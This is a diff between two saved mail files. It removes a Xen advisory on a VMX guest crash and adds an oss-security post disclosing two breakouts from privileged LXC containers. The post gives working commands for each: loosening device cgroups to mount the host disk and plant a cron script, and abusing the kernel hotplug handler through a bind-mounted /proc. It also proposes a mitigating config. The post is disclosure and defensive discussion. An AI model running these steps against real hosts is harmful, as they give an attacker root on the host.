@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["10381" "Wednesday" "11" "December" "2019" "12:09:33" "+0000" "Xen.org security team" "security@xen.org" nil "233" nil nil nil nil "12" nil nil (number mark "U       security@xen Dec 11  233/10381 " thread-indent "\"[oss-security] Xen Security Advisory 308 v3 (CVE-2019-19583) - VMX: VMentry failure with debug exceptions and blocked states\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] Xen Security Advisory 308 v3 (CVE-2019-19583) - VMX: VMentry failure with debug exceptions and blocked states" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil nil nil nil nil nil t nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["5491" "Tuesday" "12" "February" "2019" "23:34:43" "+0500" "Alexander E. Patrakov" "patrakov@gmail.com" "<CAN_LGv21xFRzej=akWo0rn2PRMydbu-+33h6uqLJ6BkzP-kf3Q@mail.gmail.com>" "131" "[oss-security] Two more LXC breakouts (both privileged), apparmor issue?" "^Cc:" nil nil "2" "2019021218:34:43" "[oss-security] Two more LXC breakouts (both privileged), apparmor issue?" (number mark "  z     patrakov@gma Feb 12  131/5491  " thread-indent "\"[oss-security] Two more LXC breakouts (both privileged), apparmor issue?\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0000
+X-Mozilla-Status: 1001
 X-Mozilla-Status2: 00000000
-Received: (qmail 14207 invoked by uid 550); 11 Dec 2019 12:09:51 -0000
+Received: (qmail 12200 invoked by uid 550); 12 Feb 2019 18:35:07 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,251 +11,170 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Reply-To: oss-security@lists.openwall.com
-Received: (qmail 14098 invoked from network); 11 Dec 2019 12:09:50 -0000
-Content-Type: multipart/mixed; boundary="=separator"; charset="utf-8"
-Content-Transfer-Encoding: binary
+Received: (qmail 12165 invoked from network); 12 Feb 2019 18:35:06 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20161025;
+        h=mime-version:from:date:message-id:subject:to:cc;
+        bh=sTNR/ub0yMtzhDcCNRS/UJYdHBwNNBk36DYdZOtRO9g=;
+        b=GUgvJgXA0JbT/Lm0dQzbgiFn/uK9pNCsKUbz6TiAQ0OROB4vntZ791b1oo49ecWzA9
+         JxUJfI7Ln33YPN6fHhbb8/UDMcSkCH5DsYrM7yuXARewPFJeYVgwiOovB0MFxJZMyMsQ
+         PyZvNpsPAU34L4dIw24xcdcSzFZQbCR13l3Snopmf+Nf9u0OYRAD4cH152gbdAJ776Ye
+         +a5ENsuYFuH6o6QTJp7KZbDsfC/8WxY8DLBuX15TRDveKSGgqbTa7074yejryGeSE6mB
+         g/aun6OCWgKMEZZ7aej+PSvXeC+6kyTZYkSGLIFplTu8A9RK6CuiGeKl9MMYdnPScZoM
+         aZwg==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20161025;
+        h=x-gm-message-state:mime-version:from:date:message-id:subject:to:cc;
+        bh=sTNR/ub0yMtzhDcCNRS/UJYdHBwNNBk36DYdZOtRO9g=;
+        b=mVEby3EcOfNAOEV8d0xzbaVrkR4dABMm5UCTdLjHORf7ClCZz1oeDyJgLuvSOR9+/c
+         4mHchVjAcRfPxY1X1KFcZRhxYjiOCBBJG6mCdomhefGWkPYL+HjA47sYNuFpS/hJ3VoA
+         Ja2IdMfucN/Qhvwtn387Qh4BZ3NQZ9NEhZ7Vkx6RsuIWsRzmktUifzl1RP6Qq6x9JVJS
+         HlHnHiHODK9koiCdqvAVwE0r5gQXCnXh8Yk9O93P+R/6MPe8MzF8cwp65S1Qs1mcTKRq
+         cDP2HybDRlH+SMYA3Zf4k2vGMZ8kBUfg0Gh/K8unHFlCUpFYseiCYrcRkuHusybQdj+n
+         IJ7Q==
+X-Gm-Message-State: AHQUAuZjJwVcBw/AaPxWSj7SvXrnWQ9rbJWQSU6lBj/lC79MEgdliMpO
+	TxFh5qPR5g5QOTJRKDqAE6tYHjULEL7ThLmiClVFXm7F
+X-Google-Smtp-Source: AHgI3IZ8neVFlg7dOqYeh6KAfeXWLAIy8fMKAAOZ9CluqnjsJOlUnVcWU6JqpaERozTEDGXgVQUv6rQq2w7TMoeCtUQ=
+X-Received: by 2002:ac8:166b:: with SMTP id x40mr3923310qtk.363.1549996494718;
+ Tue, 12 Feb 2019 10:34:54 -0800 (PST)
 MIME-Version: 1.0
-X-Mailer: MIME-tools 5.508 (Entity 5.508)
-To: xen-announce@lists.xen.org, xen-devel@lists.xen.org,
- xen-users@lists.xen.org, oss-security@lists.openwall.com
-From: Xen.org security team <security@xen.org>
-CC: Xen.org security team <security-team-members@xen.org>
-Message-Id: <E1if0o9-0001dU-9U@xenbits.xenproject.org>
-Date: Wed, 11 Dec 2019 12:09:33 +0000
-Subject: [oss-security] Xen Security Advisory 308 v3 (CVE-2019-19583) - VMX: VMentry
- failure with debug exceptions and blocked states
+Message-ID: <CAN_LGv21xFRzej=akWo0rn2PRMydbu-+33h6uqLJ6BkzP-kf3Q@mail.gmail.com>
+Content-Type: text/plain; charset="UTF-8"
+Cc: lxc-users@lists.linuxcontainers.org
+Date: Tue, 12 Feb 2019 23:34:43 +0500
+From: "Alexander E. Patrakov" <patrakov@gmail.com>
+Reply-To: oss-security@lists.openwall.com
+Subject: [oss-security] Two more LXC breakouts (both privileged), apparmor issue?
+To: oss-security@lists.openwall.com
 
---=separator
-Content-Type: text/plain; charset="utf-8"
-Content-Disposition: inline
-Content-Transfer-Encoding: 7bit
+Hello,
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA256
+there is a container breakout currently discussed (CVE-2019-5736),
+which affected LXC among others. Let me share two more, IMHO easier,
+breakout techniques that work against LXC, at least in Ubuntu 18.10,
+which has LXC 3.0.3. Both techniques work only in privileged
+containers, and so, given that LXC upstream does not treat privileged
+containers as a viable security boundary, I don't think there is
+anything CVE-worthy here, just an opportunity to tighten the defaults,
+unless this is a bug in AppArmor or its policies. Also, please treat
+this whole email as Ubuntu-specific, because of the references to
+AppArmor.
 
-            Xen Security Advisory CVE-2019-19583 / XSA-308
-                               version 3
+The primary goal of this email is to post exploits, so that I can
+point people to something better than just nonconstructive words about
+"security implications" when they ask :)
 
-     VMX: VMentry failure with debug exceptions and blocked states
+The secondary goal is to learn a bit more about AppArmor, i.e. I was
+surprised that the "mount" step works in the first exploit, want to
+know why. I.e. what's the real difference between
+"lxc-container-default" and "lxc-container-default-with-mounting"
+profiles.
 
-UPDATES IN VERSION 3
-====================
+When reproducing exploits, it is important that you install openssh in
+the test containers, and work from an ssh connection, not lxc-attach.
+That's because of slightly-different namespace setups, and because
+lxc-attach requires root, so "you already have to be root to break
+out", i.e. the achievement becomes too trivial.
 
-Public release.
+Prior art:
 
-Updated metadata to add 4.13, update StableRef's
+- myself trying to debug why the memory limit does not apply:
+https://github.com/lxc/lxc/issues/2845
+- an existing bug about unintended access to block devices:
+https://github.com/lxc/lxc/issues/2762
 
-ISSUE DESCRIPTION
-=================
+Exploit 1: abuse of device cgroups and block devices
 
-Please see XSA-260 for background on the MovSS shadow:
-  http://xenbits.xen.org/xsa/advisory-260.html
+Prerequisite: a privileged container created with the "download"
+template, without tweaking any AppArmor settings. E.g.:
 
-Please see XSA-156 for background on the need for #DB interception:
-  http://xenbits.xen.org/xsa/advisory-156.html
+sudo lxc-create -t download -n exploit1 -- -d ubuntu -r cosmic -a amd64
 
-The VMX VMEntry checks does not like the exact combination of state
-which occurs when #DB in intercepted, Single Stepping is active, and
-blocked by STI/MovSS is active, despite this being a legitimate state to
-be in.  The resulting VMEntry failure is fatal to the guest.
+Install openssh there, then let a hacker ssh into it and let them sudo
+to root. So now the hacker has root in a privileged container.
 
-IMPACT
-======
+By default, the container is covered by the
+"lxc-container-default-cgns" profile. Or at least, that's what
+mentioned in dmesg in denial messages. It specifically allows mounting
+of cgroup and cgroup2 filesystems under /sys/fs/cgroup. And, by
+default, LXC relies on systemd inside the container to mount cgroup
+hierarchies that it needs. There are also other profiles that can be
+used but are not the default:
 
-HVM/PVH guest userspace code may be able to crash the guest, resulting
-in a guest Denial of Service.
+- lxc-container-default: does not allow mounting cgroup and cgroup2
+- lxc-container-default-with-mounting: does not allow mounting cgroup
+and cgroup2, but supposedly allows ext2/3/4, xfs, and btrfs.
+- lxc-container-default-with-nesting: allows cgroup and cgroup2, also
+allows almost arbitrary bind mounts.
 
-VULNERABLE SYSTEMS
-==================
+So, to break out, let's exploit the fact that, on Ubuntu, cgroups are
+the only protection against mounting arbitrary block devices in
+containers - but, by default, there is nothing that prevents the
+hacker from lifting the restriction from within a container. So:
 
-All versions of Xen are affected.
+# Step 1: find all device cgroups, add permission to use all block devices.
+f=`find /sys/fs/cgroup -name devices.allow`
+for d in $f ; do echo -n 'b *:* rwm' > "$d" ; done # you may need to
+repeat this a few times
+for d in $f ; do echo -n 'b *:* rwm' > "$d" ; done # ok, repeating
 
-Only systems supporting VMX hardware virtual extensions (Intel, Cyrix or
-Zhaoxin CPUs) are affected. Arm and AMD systems are unaffected.
+# Step 2: find an interesting block device, create a device node and mount it.
+cat /proc/partitions # found /dev/vda1, looks like the host's root fs is there
+mknod /dev/vda1 b 252 1 # based on numbers from /proc/partitions
+mount /dev/vda1 /mnt # I don't know why this succeeds (on ext4), but it does
 
-Only HVM/PVH guests are affected.  PV guests cannot leverage the
-vulnerability.
+# Step 3: write some code that will run on the host
+nano /mnt/etc/cron.d/badscript
 
-MITIGATION
-==========
+# Step 4: wait for cron to run it on the host
 
-Running only PV guests will avoid this vulnerability.
+I was able to mitigate this by not letting the container access any
+cgroups except the bare minimum necessary for systemd to function. Not
+sure if this creates other security problems.
 
-Running HVM guests on only AMD hardware will also avoid this
-vulnerability.
+lxc.apparmor.profile = lxc-container-default
+lxc.mount.entry = tmpfs sys/fs/cgroup tmpfs nosuid,nodev,noexec,mode=755
+lxc.mount.entry = cgroup sys/fs/cgroup/systemd cgroup
+nosuid,nodev,noexec,xattr,name=systemd,create=dir
 
-CREDITS
-=======
+Question: why is this not the default?
 
-This issue was discovered by Håkon Alstadheim and diagnosed as a
-security issue by Andrew Cooper of Citrix.
+Exploit 2: abuse of hotplug handler
 
-RESOLUTION
-==========
+Prerequisite: setup for nested privileged containers. E.g. this:
 
-Applying the attached patch resolves this issue.
+sudo lxc-create -t download -n exploit2 -- -d ubuntu -r cosmic -a amd64
 
-xsa308.patch           xen-unstable, Xen 4.13.x .. Xen 4.8.x
+... with this line uncommented in the config:
 
-$ sha256sum xsa308*
-4aa06d21478d9debb12388ff14d8abc31982e18895db40d0cec78fcc9fe68ef2  xsa308.meta
-7e782b09b16f7534c8db52042f7bb3bd730d108571c8b10af184ae0b02fdae9d  xsa308.patch
-$
+lxc.include = /usr/share/lxc/config/nesting.conf
 
-DEPLOYMENT DURING EMBARGO
-=========================
+(the config does warn about "security implications", but this is not
+enough to convince people, "known root hole" would be a better
+wording).
 
-Deployment of the patches and/or mitigations described above (or
-others which are substantially similar) is permitted during the
-embargo, even on public-facing systems with untrusted guest users and
-administrators.
+To break out, let's exploit the fact that the kernel, when told so via
+/proc, will run arbitary programs for us. I mean, in reaction to
+hotplug events - the legacy handler is settable via
+/proc/sys/kernel/hotplug. There are some rules in the apparmor profile
+that prohibit writing there, but apparmor is path-based, and these
+rules would not fire if a copy of /proc is mounted somewhere else
+(which is needed for nesting but is disallowed otherwise). So:
 
-But: Distribution of updated software is prohibited (except to other
-members of the predisclosure list).
+# Step 1: write a script that will run on the host.
+nano /badscript
+chmod +x /badscript
 
-Predisclosure list members who wish to deploy significantly different
-patches and/or mitigations, please contact the Xen Project Security
-Team.
------BEGIN PGP SIGNATURE-----
+# Step 2: make it a hotplug event handler via a second instance of /proc
+mkdir /proc2
+mount --bind /proc /proc2
+echo /var/lib/lxc/exploit2/rootfs/badscript > /proc2/sys/kernel/hotplug
+# Well, there was some guessing here based on the default container
+path, I hope it's OK
 
-iQFABAEBCAAqFiEEI+MiLBRfRHX6gGCng/4UyVfoK9kFAl3w3FsMHHBncEB4ZW4u
-b3JnAAoJEIP+FMlX6CvZWHwIAIfuiZE/IyxMwTAkZL3EugBnlxxHodoBuj6imn+n
-c9DvMk3TCi3vSgvZQtVpP0eNuuLN5285hVyI95lRE0LTmtRLc7jATktStRTgGkua
-znW8U1sqkVRWJcVuN4uAM2zIY60pMZnFjZxdJW12+wpcA13LInE1cDWnlRv+cdD9
-7DtVkGUWXjfbcm3KXGZw8YpKvTgVp983VpywR/1lzXZ+MexWzKuEco8fZFayw0ne
-3nT/23Y1ofjCflNFjc7HoeJZl+zy493J/rqHS8yYI3d4vTdIfjue3rZ/X6305el9
-zjCG5zXygrWVAoKGWVnPZweX1jw8rd6BlsPTqQb53UH94zc=
-=yTxW
------END PGP SIGNATURE-----
+# Step 3: provoke some hotplug event. Actually, several events.
+ip link add dummy0 type dummy
 
---=separator
-Content-Type: application/octet-stream; name="xsa308.meta"
-Content-Disposition: attachment; filename="xsa308.meta"
-Content-Transfer-Encoding: base64
 
-ewogICJYU0EiOiAzMDgsCiAgIlN1cHBvcnRlZFZlcnNpb25zIjogWwogICAg
-Im1hc3RlciIsCiAgICAiNC4xMyIsCiAgICAiNC4xMiIsCiAgICAiNC4xMSIs
-CiAgICAiNC4xMCIsCiAgICAiNC45IiwKICAgICI0LjgiCiAgXSwKICAiVHJl
-ZXMiOiBbCiAgICAieGVuIgogIF0sCiAgIlJlY2lwZXMiOiB7CiAgICAiNC4x
-MCI6IHsKICAgICAgIlJlY2lwZXMiOiB7CiAgICAgICAgInhlbiI6IHsKICAg
-ICAgICAgICJTdGFibGVSZWYiOiAiZTQ4OTk1NTBmZjc4MzRlMWVhNWRmYmJm
-YjFjNjE4ZjY0ZTI0Nzc2MSIsCiAgICAgICAgICAiUHJlcmVxcyI6IFsKICAg
-ICAgICAgICAgMzA3CiAgICAgICAgICBdLAogICAgICAgICAgIlBhdGNoZXMi
-OiBbCiAgICAgICAgICAgICJ4c2EzMDgucGF0Y2giCiAgICAgICAgICBdCiAg
-ICAgICAgfQogICAgICB9CiAgICB9LAogICAgIjQuMTEiOiB7CiAgICAgICJS
-ZWNpcGVzIjogewogICAgICAgICJ4ZW4iOiB7CiAgICAgICAgICAiU3RhYmxl
-UmVmIjogIjIzOWQzN2U1MTRjOTNlMjlkNTBkNzFmNzM0YjFkYzQ1M2IyMjM2
-YTYiLAogICAgICAgICAgIlByZXJlcXMiOiBbCiAgICAgICAgICAgIDMwNwog
-ICAgICAgICAgXSwKICAgICAgICAgICJQYXRjaGVzIjogWwogICAgICAgICAg
-ICAieHNhMzA4LnBhdGNoIgogICAgICAgICAgXQogICAgICAgIH0KICAgICAg
-fQogICAgfSwKICAgICI0LjEyIjogewogICAgICAiUmVjaXBlcyI6IHsKICAg
-ICAgICAieGVuIjogewogICAgICAgICAgIlN0YWJsZVJlZiI6ICIyMTJiODUw
-MGNiMzk0YjNhNjY0NjU1Zjc5Y2EwYmRjYjMxMjQ2ZmY3IiwKICAgICAgICAg
-ICJQcmVyZXFzIjogWwogICAgICAgICAgICAzMDcKICAgICAgICAgIF0sCiAg
-ICAgICAgICAiUGF0Y2hlcyI6IFsKICAgICAgICAgICAgInhzYTMwOC5wYXRj
-aCIKICAgICAgICAgIF0KICAgICAgICB9CiAgICAgIH0KICAgIH0sCiAgICAi
-NC4xMyI6IHsKICAgICAgIlJlY2lwZXMiOiB7CiAgICAgICAgInhlbiI6IHsK
-ICAgICAgICAgICJTdGFibGVSZWYiOiAiZmQ5YmZhYmY2OWVhNTlmMjI4MGMx
-NzAzNTAwNzkzZmExNWU4MTk1NiIsCiAgICAgICAgICAiUHJlcmVxcyI6IFtd
-LAogICAgICAgICAgIlBhdGNoZXMiOiBbCiAgICAgICAgICAgICJ4c2EzMDgu
-cGF0Y2giCiAgICAgICAgICBdCiAgICAgICAgfQogICAgICB9CiAgICB9LAog
-ICAgIjQuOCI6IHsKICAgICAgIlJlY2lwZXMiOiB7CiAgICAgICAgInhlbiI6
-IHsKICAgICAgICAgICJTdGFibGVSZWYiOiAiYTI2MGU5M2RiNzk0ZjU2MDUw
-MmU4OTg1OWFhZjExMWQxNzhlODBlNCIsCiAgICAgICAgICAiUHJlcmVxcyI6
-IFsKICAgICAgICAgICAgMzA3CiAgICAgICAgICBdLAogICAgICAgICAgIlBh
-dGNoZXMiOiBbCiAgICAgICAgICAgICJ4c2EzMDgucGF0Y2giCiAgICAgICAg
-ICBdCiAgICAgICAgfQogICAgICB9CiAgICB9LAogICAgIjQuOSI6IHsKICAg
-ICAgIlJlY2lwZXMiOiB7CiAgICAgICAgInhlbiI6IHsKICAgICAgICAgICJT
-dGFibGVSZWYiOiAiOGQxZWU5ZjJjNDczZmVjNTRiNTAxOGMwMWFkNTU2ZDdh
-ZmQ2MmMxNyIsCiAgICAgICAgICAiUHJlcmVxcyI6IFsKICAgICAgICAgICAg
-MzA3CiAgICAgICAgICBdLAogICAgICAgICAgIlBhdGNoZXMiOiBbCiAgICAg
-ICAgICAgICJ4c2EzMDgucGF0Y2giCiAgICAgICAgICBdCiAgICAgICAgfQog
-ICAgICB9CiAgICB9LAogICAgIm1hc3RlciI6IHsKICAgICAgIlJlY2lwZXMi
-OiB7CiAgICAgICAgInhlbiI6IHsKICAgICAgICAgICJTdGFibGVSZWYiOiAi
-YjczYWFkNGM4YjZhNzY3Y2UxNWNjOGNiNjVmOWVlYWI3YmZjY2RhZSIsCiAg
-ICAgICAgICAiUHJlcmVxcyI6IFsKICAgICAgICAgICAgMzA3CiAgICAgICAg
-ICBdLAogICAgICAgICAgIlBhdGNoZXMiOiBbCiAgICAgICAgICAgICJ4c2Ez
-MDgucGF0Y2giCiAgICAgICAgICBdCiAgICAgICAgfQogICAgICB9CiAgICB9
-CiAgfQp9
-
---=separator
-Content-Type: application/octet-stream; name="xsa308.patch"
-Content-Disposition: attachment; filename="xsa308.patch"
-Content-Transfer-Encoding: base64
-
-RnJvbTogQW5kcmV3IENvb3BlciA8YW5kcmV3LmNvb3BlcjNAY2l0cml4LmNv
-bT4KU3ViamVjdDogeDg2L3Z0eDogV29yayBhcm91bmQgU2luZ2xlU3RlcCAr
-IFNUSS9Nb3ZTUyBWTUVudHJ5IGZhaWx1cmVzCgpTZWUgcGF0Y2ggY29tbWVu
-dCBmb3IgdGVjaG5pY2FsIGRldGFpbHMuCgpDb25jZXJuaW5nIHRoZSB0aW1l
-bGluZSwgdGhpcyB3YXMgZmlyc3QgZGlzY292ZXJlZCBpbiB0aGUgYWZ0ZXJt
-YXRoIG9mClhTQS0xNTYgd2hpY2ggY2F1c2VkICNEQiB0byBiZSBpbnRlcmNl
-cHRlZCB1bmNvbmRpdGlvbmFsbHksIGJ1dCBvbmx5IGluCml0cyBTaW5nbGVT
-dGVwICsgU1RJIGZvcm0gd2hpY2ggaXMgcmVzdHJpY3RlZCB0byBwcml2aWxl
-Z2VkIHNvZnR3YXJlLgoKQWZ0ZXIgd29ya2luZyB3aXRoIEludGVsIGFuZCBp
-ZGVudGlmeWluZyB0aGUgcHJvYmxlbWF0aWMgdm1lbnRyeSBjaGVjaywKdGhp
-cyB3b3JrYXJvdW5kIHdhcyBzdWdnZXN0ZWQsIGFuZCB0aGUgcGF0Y2ggd2Fz
-IHBvc3RlZCBpbiBhbiBSRkMKc2VyaWVzLiAgT3V0c3RhbmRpbmcgd29yayBm
-b3IgdGhhdCBzZXJpZXMgKG5vdCBicmVha2luZyBJbnRyb3NwZWN0aW9uKQpp
-cyBzdGlsbCBwZW5kaW5nLCBhbmQgdGhpcyBmaXggZnJvbSBpdCAod2hpY2gg
-d291bGRuJ3QgaGF2ZSBiZWVuIGdvb2QKZW5vdWdoIGluIGl0cyBvcmlnaW5h
-bCBmb3JtKSB3YXNuJ3QgY29tbWl0dGVkLgoKQSB2bWVudHJ5IGZhaWx1cmUg
-d2FzIHJlcG9ydGVkIHRvIHhlbi1kZXZlbCwgYW5kIGRlYnVnZ2luZyBpZGVu
-dGlmaWVkCnRoaXMgYnVnIGluIGl0cyBTaW5nbGVTdGVwICsgTW92U1MgZm9y
-bSBieSB3YXkgb2YgSU5UMSwgd2hpY2ggZG9lcyBub3QKaW52b2x2ZSB0aGUg
-dXNlIG9mIGFueSBwcml2aWxlZ2VkIGluc3RydWN0aW9ucywgYW5kIHByb3Zp
-bmcgdGhpcyB0byBiZSBhCnNlY3VyaXR5IGlzc3VlLgoKVGhpcyBpcyBYU0Et
-MzA4CgpSZXBvcnRlZC1ieTogSMOla29uIEFsc3RhZGhlaW0gPGhha29uQGFs
-c3RhZGhlaW0ucHJpdi5ubz4KU2lnbmVkLW9mZi1ieTogQW5kcmV3IENvb3Bl
-ciA8YW5kcmV3LmNvb3BlcjNAY2l0cml4LmNvbT4KUmV2aWV3ZWQtYnk6IEph
-biBCZXVsaWNoIDxqYmV1bGljaEBzdXNlLmNvbT4KQWNrZWQtYnk6IEtldmlu
-IFRpYW4gPGtldmluLnRpYW5AaW50ZWwuY29tPgoKZGlmZiAtLWdpdCBhL3hl
-bi9hcmNoL3g4Ni9odm0vdm14L3ZteC5jIGIveGVuL2FyY2gveDg2L2h2bS92
-bXgvdm14LmMKaW5kZXggNmE1ZWViNWMxMy4uNTliODM2ZjQzZiAxMDA2NDQK
-LS0tIGEveGVuL2FyY2gveDg2L2h2bS92bXgvdm14LmMKKysrIGIveGVuL2Fy
-Y2gveDg2L2h2bS92bXgvdm14LmMKQEAgLTM4MTYsNiArMzgxNiw0MiBAQCB2
-b2lkIHZteF92bWV4aXRfaGFuZGxlcihzdHJ1Y3QgY3B1X3VzZXJfcmVncyAq
-cmVncykKICAgICAgICAgICAgIEhWTVRSQUNFXzFEKFRSQVBfREVCVUcsIGV4
-aXRfcXVhbGlmaWNhdGlvbik7CiAgICAgICAgICAgICBfX3Jlc3RvcmVfZGVi
-dWdfcmVnaXN0ZXJzKHYpOwogICAgICAgICAgICAgd3JpdGVfZGVidWdyZWco
-NiwgZXhpdF9xdWFsaWZpY2F0aW9uIHwgRFJfU1RBVFVTX1JFU0VSVkVEX09O
-RSk7CisKKyAgICAgICAgICAgIC8qCisgICAgICAgICAgICAgKiBXb3JrIGFy
-b3VuZCBTaW5nbGVTdGVwICsgU1RJL01vdlNTIFZNRW50cnkgZmFpbHVyZXMu
-CisgICAgICAgICAgICAgKgorICAgICAgICAgICAgICogV2UgaW50ZXJjZXB0
-ICNEQiB1bmNvbmRpdGlvbmFsbHkgdG8gd29yayBhcm91bmQgQ1ZFLTIwMTUt
-ODEwNCAvCisgICAgICAgICAgICAgKiBYU0EtMTU2IChndWVzdC1rZXJuZWwg
-aW5kdWNlZCBob3N0IERvUykuCisgICAgICAgICAgICAgKgorICAgICAgICAg
-ICAgICogU1RJL01vdlNTIHNoYWRvd3MgYmxvY2svZGVmZXIgaW50ZXJydXB0
-cy9leGNlcHRpb25zIChleGFjdAorICAgICAgICAgICAgICogZGV0YWlscyBh
-cmUgY29tcGxpY2F0ZWQgYW5kIHBvb3JseSBkb2N1bWVudGVkKS4gIERlYnVn
-CisgICAgICAgICAgICAgKiBleGNlcHRpb25zIGRlbGF5ZWQgZm9yIGFueSBy
-ZWFzb24gYXJlIHN0b3JlZCBpbiB0aGUKKyAgICAgICAgICAgICAqIFBFTkRJ
-TkdfREJHX0VYQ0VQVElPTlMgZmllbGQuCisgICAgICAgICAgICAgKgorICAg
-ICAgICAgICAgICogVGhlIGZhbGxpbmcgZWRnZSBvZiBQRU5ESU5HX0RCRyBj
-YXVzZXMgI0RCIHRvIGJlIGRlbGl2ZXJlZCwKKyAgICAgICAgICAgICAqIHJl
-c3VsdGluZyBpbiBhIFZNRXhpdCwgYXMgI0RCIGlzIGludGVyY2VwdGVkLiAg
-VGhlIFZNQ1Mgc3RpbGwKKyAgICAgICAgICAgICAqIHJlcG9ydHMgYmxvY2tl
-ZC1ieS1TVEkvTW92U1MuCisgICAgICAgICAgICAgKgorICAgICAgICAgICAg
-ICogVGhlIFZNRW50cnkgY2hlY2tzIHdoZW4gRUZMQUdTLlRGIGlzIHNldCBk
-b24ndCBsaWtlIGEgVk1DUyBpbgorICAgICAgICAgICAgICogdGhpcyBzdGF0
-ZS4gIERlc3BpdGUgYSAjREIgcXVldWVkIGluIFZNRU5UUllfSU5UUl9JTkZP
-LCB0aGUKKyAgICAgICAgICAgICAqIHN0YXRlIGlzIHJlamVjdGVkIGFzIERS
-Ni5CUyBpc24ndCBwZW5kaW5nLiAgRml4IHRoaXMgdXAuCisgICAgICAgICAg
-ICAgKi8KKyAgICAgICAgICAgIGlmICggdW5saWtlbHkocmVncy0+ZWZsYWdz
-ICYgWDg2X0VGTEFHU19URikgKQorICAgICAgICAgICAgeworICAgICAgICAg
-ICAgICAgIHVuc2lnbmVkIGxvbmcgaW50X2luZm87CisKKyAgICAgICAgICAg
-ICAgICBfX3ZtcmVhZChHVUVTVF9JTlRFUlJVUFRJQklMSVRZX0lORk8sICZp
-bnRfaW5mbyk7CisKKyAgICAgICAgICAgICAgICBpZiAoIGludF9pbmZvICYg
-KFZNWF9JTlRSX1NIQURPV19TVEkgfCBWTVhfSU5UUl9TSEFET1dfTU9WX1NT
-KSApCisgICAgICAgICAgICAgICAgeworICAgICAgICAgICAgICAgICAgICB1
-bnNpZ25lZCBsb25nIHBlbmRpbmdfZGJnOworCisgICAgICAgICAgICAgICAg
-ICAgIF9fdm1yZWFkKEdVRVNUX1BFTkRJTkdfREJHX0VYQ0VQVElPTlMsICZw
-ZW5kaW5nX2RiZyk7CisgICAgICAgICAgICAgICAgICAgIF9fdm13cml0ZShH
-VUVTVF9QRU5ESU5HX0RCR19FWENFUFRJT05TLAorICAgICAgICAgICAgICAg
-ICAgICAgICAgICAgICAgcGVuZGluZ19kYmcgfCBEUl9TVEVQKTsKKyAgICAg
-ICAgICAgICAgICB9CisgICAgICAgICAgICB9CisKICAgICAgICAgICAgIGlm
-ICggIXYtPmRvbWFpbi0+ZGVidWdnZXJfYXR0YWNoZWQgKQogICAgICAgICAg
-ICAgewogICAgICAgICAgICAgICAgIHVuc2lnbmVkIGxvbmcgaW5zbl9sZW4g
-PSAwOwo=
-
---=separator--
+-- 
+Alexander E. Patrakov
